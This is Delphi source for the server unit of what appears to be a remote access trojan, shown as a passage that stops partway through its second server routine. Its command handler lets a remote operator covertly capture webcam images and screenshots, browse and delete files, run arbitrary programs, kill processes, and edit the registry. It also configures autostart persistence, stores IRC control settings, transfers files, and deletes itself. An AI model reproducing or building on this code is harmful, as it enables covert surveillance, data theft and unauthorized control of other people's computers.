   unit ServersUnit;

   interface
   Uses
   winsock, windows, messages, allstrings, Encryption, untScreenGrab,
   untfunctions, shellapi, pngimage, pnglang, pngzlib, unttransfer;

   PROCEDURE SERVER1_START;
   FUNCTION WIN1(WIN:HWND; MESS:WORD; WPR:WORD; LPR:LONGINT):LONGINT; STDCALL;
   PROCEDURE SOCKETREAD1;
   FUNCTION RECEIVECMD2:STRING;
   PROCEDURE SOCKETREAD2;
   FUNCTION WIN2(WIN:HWND; MESS:WORD; WPR:WORD; LPR:LONGINT):LONGINT; STDCALL;
   PROCEDURE SERVER2_START;
   FUNCTION RECEIVECMD1:STRING;

   implementation

   PROCEDURE SOCKETREAD1;
   VAR
    I      : INTEGER;
    STR    : STRING;
    AN     : STRING;
    CMD    : STRING;
    PARAM  : STRING;
    SYSDIR : STRING;
    SETTINGS:textfile;
    SET1,SET2:STRING;
    eROOT, eKEY, eVALUE, eVALUE2:STRING;

   function AnsiUpperCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;

   FUNCTION EXTRACTFILENAME(STR:STRING):STRING;
   VAR
    I:INTEGER;
   BEGIN
    IF STR = '' THEN EXIT;
    REPEAT
     I := POS('\',STR);
     RESULT := COPY(STR,i+1,LENGTH(STR));
     STR := COPY(STR,I+1,LENGTH(STR));
    UNTIL POS('\',STR)=0;
   END;

   FUNCTION EXTRACTFILEPATH(STR:STRING):STRING;
   VAR
    I:INTEGER;
   BEGIN
    IF STR = '' THEN EXIT;
    REPEAT
     I := POS('\',STR);
     RESULT := RESULT + COPY(STR,1,i-1);
     STR := COPY(STR,I+1,LENGTH(STR));
    UNTIL POS('\',STR)=0;
   END;

   BEGIN
    GETSYSTEMDIRECTORY(DIR,255);
    SYSDIR := DIR;
    SOCKETREADISCALLER1 := TRUE;
    STR := RECEIVECMD1;
    SOCKETREADISCALLER1 := FALSE;
    STR := DECRYPT(STR);
    IF COPY(STR,1,5) = 'PASS:' THEN BEGIN
     IF COPY(STR,6,LENGTH(STR)) = DECRYPT(PASSWORD) THEN BEGIN
      AN := ENCRYPT('PA');
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     END ELSE BEGIN
      AN := ENCRYPT('PF');
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     END;
     EXIT;
    END;
    CMD := COPY(STR, 1, 2);
    PARAM := COPY(STR, 3, LENGTH(STR));
    IF CMD = '0' THEN BEGIN
     IF (decrypt(PASSWORD) <> '') and (decrypt(PASSWORD) <> '^') THEN
     STR := encrypt('PY') ELSE STR := encrypt('PN');
     SEND(CONSERVER1, STR[1], LENGTH(STR), 0);
     CONNECTED1 := TRUE;
    END ELSE
    IF CMD = '20' THEN BEGIN
     AN := ENCRYPT('20'+DECRYPT(SERV_TRANSP));
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '24' THEN BEGIN
     SetWindowText(strtoint(copy(param,1,pos(';',param)-1)),pchar(copy(param,pos(';',param)+1,length(param))));
    END ELSE
    IF CMD = '25' THEN BEGIN
     ShowWindow(strtoint(param),0);
    END ELSE
    IF CMD = '26' THEN BEGIN
     ShowWindow(strtoint(Param),1);
    END ELSE
    IF CMD = '27' THEN BEGIN
     PostMessage(strtoint(Param), CM_EXIT, 0, 0);
    END ELSE
    IF CMD = '11' THEN BEGIN
     ZEROMEMORY(@EROOT, LENGTH(EROOT));
     ZEROMEMORY(@EKEY, LENGTH(EKEY));
     ZEROMEMORY(@EVALUE, LENGTH(EVALUE));
     EROOT := COPY(PARAM,1,POS(':',PARAM)-1);
     PARAM := COPY(PARAM,POS(':',PARAM)+1, LENGTH(PARAM));
     EKEY := COPY(PARAM,1,POS(':',PARAM)-1);
     PARAM := COPY(PARAM,POS(':',PARAM)+1, LENGTH(PARAM));
     EVALUE := COPY(PARAM,1,POS(';',PARAM)-1);
     IF ANSIUPPERCASE(EROOT) = 'HKEY_CURRENT_USER' THEN
      AN := ENCRYPT('11'+EVALUE+':'+GetRegValue(HKEY_CURRENT_USER,EKEY,EVALUE)+';');
     IF ANSIUPPERCASE(EROOT) = 'HKEY_CLASSES_ROOT' THEN
      AN := ENCRYPT('11'+EVALUE+':'+GetRegValue(HKEY_CLASSES_ROOT,EKEY,EVALUE)+';');
     IF ANSIUPPERCASE(EROOT) = 'HKEY_LOCAL_MACHINE' THEN
      AN := ENCRYPT('11'+EVALUE+':'+GetRegValue(HKEY_LOCAL_MACHINE,EKEY,EVALUE)+';');
     IF ANSIUPPERCASE(EROOT) = 'HKEY_USERS' THEN
      AN := ENCRYPT('11'+EVALUE+':'+GetRegValue(HKEY_USERS,EKEY,EVALUE)+';');
     IF ANSIUPPERCASE(EROOT) = 'HKEY_CURRENT_CONFIG' THEN
      AN := ENCRYPT('11'+EVALUE+':'+GetRegValue(HKEY_CURRENT_CONFIG,EKEY,EVALUE)+';');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '12' THEN BEGIN
     AN := COPY(PARAM,1,POS(';',PARAM)-1);
     ASSIGNFILE(SETTINGS,AN);
     REWRITE(SETTINGS);
     WRITE(SETTINGS,COPY(PARAM,POS(';',PARAM)+1,LENGTH(PARAM)));
     CLOSEFILE(SETTINGS);
     SHELLEXECUTE(0,'open',PCHAR(AN),nil,nil,1);
    END ELSE
    IF CMD = '13' THEN BEGIN
     AN := ENCRYPT('13');
     AN := AN + ENCRYPT('Exename:'+extractfilename(paramstr(0))+';');
     AN := AN + ENCRYPT('Path:'+paramstr(0)+';');
     IF ((PASSWORD) <> '') and ((PASSWORD) <> '^') THEN
      AN := AN + ENCRYPT('Password:YES'+';')
     ELSE
      AN := AN + ENCRYPT('Password:NO'+';');
     AN := AN + ENCRYPT('IRCNick:'+DECRYPT((IRC_NICK1))+';');
     AN := AN + ENCRYPT('IRCNick Backup:'+DECRYPT((IRC_NICK2))+';');
     AN := AN + ENCRYPT('IRCChan:'+DECRYPT((IRC_CHAN1))+';');
     AN := AN + ENCRYPT('IRCChan Backup:'+DECRYPT((IRC_CHAN2))+';');
     AN := AN + ENCRYPT('IRCServ:'+DECRYPT((IRC_SERV1))+';');
     AN := AN + ENCRYPT('IRCServ Backup:'+DECRYPT((IRC_SERV2))+';');
     AN := AN + ENCRYPT('IRCKey:'+DECRYPT((IRC_CKEY1))+';');
     AN := AN + ENCRYPT('IRCKey Backup:'+DECRYPT((IRC_CKEY2))+';');
     AN := AN + ENCRYPT('Port Traffic:'+DECRYPT(SERV_TRAFFICP)+';');
     AN := AN + ENCRYPT('Port Transfer:'+DECRYPT(SERV_TRANSP)+';');
     CASE STRTOINT(DECRYPT(SERV_AUTOSTART)) OF
      1:  AN := AN + ENCRYPT('Autostart:Win.ini;');
      2:  AN := AN + ENCRYPT('Autostart:System.ini;');
      3:  AN := AN + ENCRYPT('Autostart:RegEdit['+DECRYPT((SERV_REGKEY))+':'+DECRYPT((SERV_REGVALUE))+'];');
      4:  AN := AN + ENCRYPT('Autostart:None;');
     END;
     AN := AN + ENCRYPT('CGI:'+DECRYPT((SERV_CGI))+';');
     AN := AN + ENCRYPT('PHP:'+DECRYPT((SERV_PHP))+';');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '14' THEN BEGIN
     SENDING := FALSE;
    END ELSE
    IF CMD = '15' THEN BEGIN
     AN := ENCRYPT('15'+getdrives);
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '16' THEN BEGIN
     LISTDIR(PARAM);
     AN := ENCRYPT('16'+SYSDIR+'\FILES.LST');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '17' THEN BEGIN
     DELETEFILE(PCHAR(PARAM));
    END ELSE
    IF CMD = '18' THEN BEGIN
     SPECIALFUCKFOLDER(PARAM);
    END ELSE
    IF CMD = '19' THEN BEGIN
     SHELLEXECUTE(0, 'open', PCHAR(PARAM), NIL, NIL, 1);
    END ELSE
    IF CMD = '22' THEN BEGIN
     AN := ENCRYPT('22'+LISTPROC);
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '23' THEN BEGIN
     KILLPROC(PARAM);
    END ELSE
    IF CMD = '50' THEN BEGIN
     //WEBCAM
     TRY
     if param = '' then param := '5';
      PngObject := TPngObject.Create;
      IF GetBitMapFromWebcam = 0 then begin
       AN := ENCRYPT('500');
       SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
       Exit;
      end;
      PngObject.AssignHandle(GetBitMapFromWebcam, False, 0);
      PngObject.CompressionLevel :=strtoint(param);
      PngObject.SaveToFile(SYSDIR+'\WEBCAM.PNG');
      PngObject.Free;
      Sleep(200);
      AN := ENCRYPT('50'+SYSDIR+'\WEBCAM.PNG');
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     EXCEPT
      AN := ENCRYPT('500');
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     END;
    END ELSE
    IF CMD = '51' THEN BEGIN
     //SCREENSHOT
     TRY
      if param = '' then param := '5';
      PngObject := TPngObject.Create;
      PngObject.AssignHandle(GetBitMapFromDesktop, False, 0);
      PngObject.CompressionLevel := strtoint(param);
      PngObject.SaveToFile(SYSDIR+'\SCREEN.PNG');
      PngObject.Free;
      Sleep(200);
      AN := ENCRYPT('51'+SYSDIR+'\SCREEN.PNG');
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     EXCEPT
      AN := ENCRYPT('510');
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     END;
    END ELSE
    IF CMD = '37' THEN BEGIN
     IRC_NICK1 := ENCRYPT(PARAM);
     AN := ENCRYPT('37');
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '38' THEN BEGIN
     IRC_NICK2 := ENCRYPT(PARAM);
     AN := ENCRYPT('38');
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '39' THEN BEGIN
     IRC_CHAN1 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '40' THEN BEGIN
     IRC_CHAN2 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '41' THEN BEGIN
     IRC_SERV1 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '42' THEN BEGIN
     IRC_SERV2 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '43' THEN BEGIN
     IRC_CKEY1 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '44' THEN BEGIN
     IRC_CKEY2 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '45' THEN BEGIN
     IRC_MASTER1 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '46' THEN BEGIN
     IRC_MASTER2 := ENCRYPT(PARAM);
     AN := ENCRYPT(CMD);
     SEND(CONSERVER1,AN[1],LENGTH(AN),0);
     SAVEREG;
    END ELSE
    IF CMD = '47' THEN BEGIN
     AN := ENCRYPT('47'+DECRYPT(IRC_NICK1)+';'+DECRYPT(IRC_NICK2)+';');
     AN := AN + ENCRYPT(DECRYPT(IRC_CHAN1)+';'+DECRYPT(IRC_CHAN2)+';');
     AN := AN + ENCRYPT(DECRYPT(IRC_SERV1)+';'+DECRYPT(IRC_SERV2)+';');
     AN := AN + ENCRYPT(DECRYPT(IRC_CKEY1)+';'+DECRYPT(IRC_CKEY2)+';');
     AN := AN + ENCRYPT(DECRYPT(IRC_MASTER1)+';'+DECRYPT(IRC_MASTER2)+';');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '36' THEN BEGIN
     AN := ENCRYPT('36'+DECRYPT(SERV_TRAFFICP)+';'+DECRYPT(SERV_TRANSP)+';');
     AN := AN + ENCRYPT(DECRYPT(SERV_AUTOSTART)+';');
     IF DECRYPT(SERV_AUTOSTART) = '1' THEN AN := AN + ENCRYPT(DECRYPT(SERV_SYSNAME)+';');
     IF DECRYPT(SERV_AUTOSTART) = '2' THEN AN := AN + ENCRYPT(DECRYPT(SERV_WINNAME)+';');
     IF DECRYPT(SERV_AUTOSTART) = '3' THEN AN := AN + ENCRYPT(DECRYPT(SERV_REGKEY)+';'+DECRYPT(SERV_REGVALUE)+';');
     IF DECRYPT(SERV_AUTOSTART) = '4' THEN AN := AN + ENCRYPT('8;');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '29' THEN BEGIN {TRAFFIC PORT}
     SERV_TRAFFICP := ENCRYPT(PARAM);
     AN := ENCRYPT('29');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '30' THEN BEGIN {TRANSFER PORT}
     SERV_TRANSP := ENCRYPT(PARAM);
     AN := ENCRYPT('30');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '31' THEN BEGIN {AUTOSTART}
     SERV_AUTOSTART := ENCRYPT(PARAM);
     AN := ENCRYPT('31');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
     SETAUTOSTART;
    END ELSE
    IF CMD = '32' THEN BEGIN {REGKEY}
     SERV_REGKEY := ENCRYPT(PARAM);
     AN := ENCRYPT('32');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '33' THEN BEGIN {REGVALUE}
     SERV_REGVALUE := ENCRYPT(PARAM);
     AN := ENCRYPT('33');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '34' THEN BEGIN {WINNAME}
     SERV_WINNAME := ENCRYPT(PARAM);
     AN := ENCRYPT('34');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '35' THEN BEGIN {SYSNAME}
     SERV_SYSNAME := ENCRYPT(PARAM);
     AN := ENCRYPT('35');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '48' THEN BEGIN {CGI}
     SERV_CGI := ENCRYPT(PARAM);
     AN := ENCRYPT('48');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '50' THEN BEGIN {PHP}
     SERV_PHP := ENCRYPT(PARAM);
     AN := ENCRYPT('50');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '49' THEN BEGIN {PASSWORD}
    IF COPY(PARAM,1,POS(CHR(0160),PARAM)-1) = PASSWORD THEN
     PASSWORD := ENCRYPT(COPY(PARAM,POS(CHR(0160),PARAM)+1,LENGTH(PARAM)));
     AN := ENCRYPT('49');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
     SAVEREG;
    END ELSE
    IF CMD = '28' THEN BEGIN
     AN := ENCRYPT(CMD+GETWINS);
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '52' THEN BEGIN
     SERV_AUTOSTART := ENCRYPT('4');
     SETAUTOSTART;
     ASSIGNFILE(SETTINGS,'C:\R.BAT');
     REWRITE(SETTINGS);
     WRITELN(SETTINGS,'DEL "'+Paramstr(0)+'"');
     WRITELN(SETTINGS,'DEL "C:\R.BAT"');
     CLOSEFILE(SETTINGS);
     SHELLEXECUTE(0,'open',PCHAR('C:\R.BAT'),nil,nil,1);
     EXITPROCESS(0);
    END ELSE
    IF CMD = '53' THEN BEGIN
     EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
     EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
     IF EROOT = 'HKEY_LOCAL_MACHINE' THEN
      ReadRegEdit(HKEY_LOCAL_MACHINE,EKEY,1);
     IF EROOT = 'HKEY_CLASSES_ROOT' THEN
      ReadRegEdit(HKEY_CLASSES_ROOT,EKEY,1);
     IF EROOT = 'HKEY_CURRENT_USER' THEN
      ReadRegEdit(HKEY_CURRENT_USER,EKEY,1);
     IF EROOT = 'HKEY_USERS' THEN
      ReadRegEdit(HKEY_USERS,EKEY,1);
     IF EROOT = 'HKEY_CURRENT_CONFIG' THEN
      ReadRegEdit(HKEY_CURRENT_CONFIG,EKEY,1);
     AN := ENCRYPT('53'+SYSDIR+'\REGKEY.LST');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '54' THEN BEGIN
     EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
     EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
     IF EROOT = 'HKEY_LOCAL_MACHINE' THEN
      ReadRegEdit(HKEY_LOCAL_MACHINE,EKEY,2);
     IF EROOT = 'HKEY_CLASSES_ROOT' THEN
      ReadRegEdit(HKEY_CLASSES_ROOT,EKEY,2);
     IF EROOT = 'HKEY_CURRENT_USER' THEN
      ReadRegEdit(HKEY_CURRENT_USER,EKEY,2);
     IF EROOT = 'HKEY_USERS' THEN
      ReadRegEdit(HKEY_USERS,EKEY,2);
     IF EROOT = 'HKEY_CURRENT_CONFIG' THEN
      ReadRegEdit(HKEY_CURRENT_CONFIG,EKEY,2);
     AN := ENCRYPT('54'+SYSDIR+'\REGVAL.LST');
     SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END ELSE
    IF CMD = '55' THEN BEGIN
     EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
     EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
     EVALUE := COPY(EKEY,POS(CHR(0160),EKEY)+1,LENGTH(EKEY));
     EKEY := COPY(EKEY,1,POS(CHR(0160),EKEY)-1);
     IF EROOT = 'HKEY_LOCAL_MACHINE' THEN
      DeleteRegKey(HKEY_LOCAL_MACHINE,EKEY, EVALUE);
     IF EROOT = 'HKEY_CLASSES_ROOT' THEN
      DeleteRegKey(HKEY_CLASSES_ROOT,EKEY, EVALUE);
     IF EROOT = 'HKEY_CURRENT_USER' THEN
      DeleteRegKey(HKEY_CURRENT_USER,EKEY, EVALUE);
     IF EROOT = 'HKEY_USERS' THEN
      DeleteRegKey(HKEY_USERS,EKEY, EVALUE);
     IF EROOT = 'HKEY_CURRENT_CONFIG' THEN
      DeleteRegKey(HKEY_CURRENT_CONFIG,EKEY, EVALUE);
    END ELSE
    IF CMD = '56' THEN BEGIN
     EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
     EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
     EVALUE := COPY(EKEY,POS(CHR(0160),EKEY)+1,LENGTH(EKEY));
     EKEY := COPY(EKEY,1,POS(CHR(0160),EKEY)-1);
     IF EROOT = 'HKEY_LOCAL_MACHINE' THEN
      DeleteRegValue(HKEY_LOCAL_MACHINE,EKEY, EVALUE);
     IF EROOT = 'HKEY_CLASSES_ROOT' THEN
      DeleteRegValue(HKEY_CLASSES_ROOT,EKEY, EVALUE);
     IF EROOT = 'HKEY_CURRENT_USER' THEN
      DeleteRegValue(HKEY_CURRENT_USER,EKEY, EVALUE);
     IF EROOT = 'HKEY_USERS' THEN
      DeleteRegValue(HKEY_USERS,EKEY, EVALUE);
     IF EROOT = 'HKEY_CURRENT_CONFIG' THEN
      DeleteRegValue(HKEY_CURRENT_CONFIG,EKEY, EVALUE);
    END ELSE
    IF CMD = '57' THEN BEGIN
     EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
     EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
     EVALUE := COPY(EKEY,POS(chr(0160),EKEY)+1, Length(EKEY));
     EVALUE2 := COPY(EVALUE,POS(chr(0160),EVALUE)+1, LENGTH(EVALUE));
     EVALUE := COPY(EVALUE,1,POS(chr(0160),EVALUE)+1);
     EKEY := COPY(EKEY,1,POS(chr(0160),EKEY)-1);
     EVALUE := COPY(EVALUE,1,POS(chr(0160),EVALUE)-1);
     {hkey soft key val }
     IF EROOT = 'HKEY_LOCAL_MACHINE' THEN
      SetRegValue(HKEY_LOCAL_MACHINE,EKEY, EVALUE, EVALUE2);
     IF EROOT = 'HKEY_CLASSES_ROOT' THEN
      SetRegValue(HKEY_CLASSES_ROOT,EKEY, EVALUE, EVALUE2);
     IF EROOT = 'HKEY_CURRENT_USER' THEN
      SetRegValue(HKEY_CURRENT_USER,EKEY, EVALUE, EVALUE2);
     IF EROOT = 'HKEY_USERS' THEN
      SetRegValue(HKEY_USERS,EKEY, EVALUE, EVALUE2);
     IF EROOT = 'HKEY_CURRENT_CONFIG' THEN
      SetRegValue(HKEY_CURRENT_CONFIG,EKEY, EVALUE, EVALUE2);
    END ELSE
    IF CMD = '58' THEN BEGIN
     EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
     EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
     EVALUE := EXTRACTFILENAME(EKEY);
     EKEY := EXTRACTFILEPATH(EKEY);
     IF EROOT = 'HKEY_LOCAL_MACHINE' THEN
      AN:=CMD+GetRegValue(HKEY_LOCAL_MACHINE,EKEY, EVALUE);
     IF EROOT = 'HKEY_CLASSES_ROOT' THEN
      AN:=CMD+GetRegValue(HKEY_CLASSES_ROOT,EKEY, EVALUE);
     IF EROOT = 'HKEY_CURRENT_USER' THEN
      AN:=CMD+GetRegValue(HKEY_CURRENT_USER,EKEY, EVALUE);
     IF EROOT = 'HKEY_USERS' THEN
      AN:=CMD+GetRegValue(HKEY_USERS,EKEY, EVALUE);
     IF EROOT = 'HKEY_CURRENT_CONFIG' THEN
      AN:=CMD+GetRegValue(HKEY_CURRENT_CONFIG,EKEY, EVALUE);
     IF AN <> '' THEN
      SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    END;
   END;

   FUNCTION WIN1(WIN:HWND; MESS:WORD; WPR:WORD; LPR:LONGINT):LONGINT; STDCALL;
   VAR
    STR:STRING;
   BEGIN
    RESULT := 0;
    CASE MESS OF
     SM_CONNECT: BEGIN
      IF CONNECTED1 THEN BEGIN
       EXIT;
      END;
      REMOTESOCKADDRLEN1^ := SIZEOF(REMOTESOCKADDR1^);
      CONSERVER1 := ACCEPT(SERVER1, REMOTESOCKADDR1, REMOTESOCKADDRLEN1);
      WSAASYNCSELECT(CONSERVER1, MAINWIN1, SM_SOCKET, FD_READ OR FD_CLOSE);
      EXIT;
     END;
     SM_SOCKET: CASE LOWORD(LPR) OF
      FD_READ: SOCKETREAD1;
      FD_CLOSE: BEGIN
       CONNECTED1 := FALSE;
       EXIT;
      END;
     END;
     WM_CLOSE: BEGIN
      POSTQUITMESSAGE(0);
      EXITPROCESS(0);
     END;
     WM_DESTROY: BEGIN
      POSTQUITMESSAGE(0);
      EXITPROCESS(0);
     END;
     WM_QUIT: BEGIN
      EXITPROCESS(0);
     END;
    END;
    RESULT := DEFWINDOWPROC(WIN, MESS, WPR, LPR);
   END;

   PROCEDURE SERVER1_START;
   VAR
    P:INTEGER;
   BEGIN
    INST1 := GETMODULEHANDLE(NIL);
    WITH WCLASS1 DO BEGIN
     STYLE := CS_CLASSDC OR CS_PARENTDC;
     LPFNWNDPROC := @WIN1;
     HINSTANCE := INST1;
     HBRBACKGROUND := COLOR_BTNFACE + 1;
     LPSZCLASSNAME := SERVERCLASS1;
     HCURSOR := LOADCURSOR(0, IDC_ARROW);
    END;
    REGISTERCLASS(WCLASS1);
    MAINWIN1 := CREATEWINDOW(SERVERCLASS1, NIL, 0, 0, 0, GETSYSTEMMETRICS(SM_CXSCREEN), GETSYSTEMMETRICS(SM_CYSCREEN), 0, 0, INST1, NIL);
    WSASTARTUP($0101, WSDATA1);
    SERVER1 := SOCKET(PF_INET, SOCK_STREAM, IPPROTO_IP);
    ASOCKADDR_IN1.SIN_FAMILY := PF_INET;
    ASOCKADDR_IN1.SIN_ADDR.S_ADDR := INADDR_ANY;
    P := STRTOINT(DECRYPT(SERV_TRAFFICP));
    ASOCKADDR_IN1.SIN_PORT := HTONS(P);
    BIND(SERVER1, ASOCKADDR_IN1, SIZEOF(ASOCKADDR_IN1));
    LISTEN(SERVER1, 1);
    WSAASYNCSELECT(SERVER1, MAINWIN1, SM_CONNECT, FD_ACCEPT);
    GETMEM( REMOTESOCKADDR1, SIZEOF(REMOTESOCKADDR1^));
    GETMEM( REMOTESOCKADDRLEN1, SIZEOF(REMOTESOCKADDRLEN1^));
    WHILE GETMESSAGE(MSG1, 0, 0, 0) DO BEGIN
     DISPATCHMESSAGE(MSG1);
     TRANSLATEMESSAGE(MSG1);
    END;
   END;

   FUNCTION RECEIVECMD2:STRING;
   VAR
    STR    : SHORTSTRING;
    RES    : SHORTSTRING;
    TMP    : CARDINAL;
   LABEL Z;
   BEGIN
    STR := '';
    RES := '';
    TMP := GETTICKCOUNT;
    REPEAT
     Z:
     BSIZ2 := RECV(CONSERVER2, STR[1], 255, 0);
     IF BSIZ2 = -1 THEN BEGIN
      BSIZ2 := WSAGETLASTERROR;
      IF BSIZ2 = WSAEWOULDBLOCK THEN BEGIN
       IF SOCKETREADISCALLER2 THEN BEGIN
        {IF TMP + 500 <= GETTICKCOUNT THEN} BEGIN
         RES := 'E!'#13;
         BREAK;
        END;
       END;
       CONTINUE;
      END ELSE BEGIN
       BREAK;
      END;
     END;
     SETLENGTH(STR, BSIZ2);
     RES := RES + STR;
     IF NOT CONNECTED2 THEN BREAK;
     IF TMP + 40000 <= GETTICKCOUNT THEN BREAK;
     IF RES = '' THEN GOTO Z;
    UNTIL RES[LENGTH(RES)] = #13;
    SETLENGTH(RES, LENGTH(RES) - 1);
    RESULT := RES;
   END;

   PROCEDURE SOCKETREAD2;
   VAR
    I      : INTEGER;
    STR    : STRING;
    AN     : STRING;
    CMD    : STRING;
    PARAM  : STRING;
   BEGIN
    SOCKETREADISCALLER2 := TRUE;
    STR := receivecmd2;
    SOCKETREADISCALLER2 := FALSE;
    STR := DECRYPT(STR);
    CMD := COPY(STR, 1, 2);
    PARAM := COPY(STR, 3, LENGTH(STR));
    IF CMD = '20' THEN BEGIN
     SENDING := TRUE;
     RECEIVEFILE(PARAM);
     SENDING := FALSE;
    END ELSE
    IF CMD = '21' THEN BEGIN
     SENDING := TRUE;
     SLEEP(100);
     SENDFILE(PARAM);
     SENDING := FALSE;
    END;
   END;

   FUNCTION WIN2(WIN:HWND; MESS:WORD; WPR:WORD; LPR:LONGINT):LONGINT; STDCALL;
   VAR
    AN:STRING;
   BEGIN
    RESULT := 0;
    CASE MESS OF
     SM_CONNECT: BEGIN
      IF CONNECTED2 THEN BEGIN
       EXIT;
      END;
      REMOTESOCKADDRLEN2^ := SIZEOF(REMOTESOCKADDR2^);
      CONSERVER2 := ACCEPT(SERVER2, REMOTESOCKADDR2, REMOTESOCKADDRLEN2);
      WSAASYNCSELECT(CONSERVER2, MAINWIN2, SM_SOCKET, FD_READ OR FD_CLOSE);
      AN := encrypt('0');
      SEND(CONSERVER2, AN[1], LENGTH(AN), 0);
      CONNECTED2 := TRUE;
      EXIT;
     END;
     SM_SOCKET: CASE LOWORD(LPR) OF
      FD_READ: SOCKETREAD2;
      FD_CLOSE: BEGIN
       CONNECTED2 := FALSE;
       SENDING := FALSE;
       EXIT;
      END;
     END;
     WM_CLOSE: BEGIN
      SENDING := FALSE;
      POSTQUITMESSAGE(0);
      EXITPROCESS(0);
     END;
     WM_DESTROY: BEGIN
      SENDING := FALSE;
      POSTQUITMESSAGE(0);
      EXITPROCESS(0);
     END;
     WM_QUIT: BEGIN
      SENDING := FALSE;
      EXITPROCESS(0);
     END;
    END;
    RESULT := DEFWINDOWPROC(WIN, MESS, WPR, LPR);
   END;

   PROCEDURE SERVER2_START;
   VAR
    P:INTEGER;
   BEGIN
    INST2 := GETMODULEHANDLE(NIL);
    WITH WCLASS2 DO BEGIN
     STYLE := CS_CLASSDC OR CS_PARENTDC;
     LPFNWNDPROC := @WIN2;
     HINSTANCE := INST2;
     HBRBACKGROUND := COLOR_BTNFACE + 1;
     LPSZCLASSNAME := SERVERCLASS2;
     HCURSOR := LOADCURSOR(0, IDC_ARROW);
    END;
    REGISTERCLASS(WCLASS2);
    MAINWIN2 := CREATEWINDOW(SERVERCLASS2, NIL, 0, 0, 0, GETSYSTEMMETRICS(SM_CXSCREEN), GETSYSTEMMETRICS(SM_CYSCREEN), 0, 0, INST2, NIL);
    WSASTARTUP($0101, WSDATA2);
    SERVER2 := SOCKET(PF_INET, SOCK_STREAM, IPPROTO_IP);
    ASOCKADDR_IN2.SIN_FAMILY := PF_INET;
    ASOCKADDR_IN2.SIN_ADDR.S_ADDR := INADDR_ANY;
    P := STRTOINT(DECRYPT(SERV_TRANSP));
    ASOCKADDR_IN2.SIN_PORT := HTONS(P);
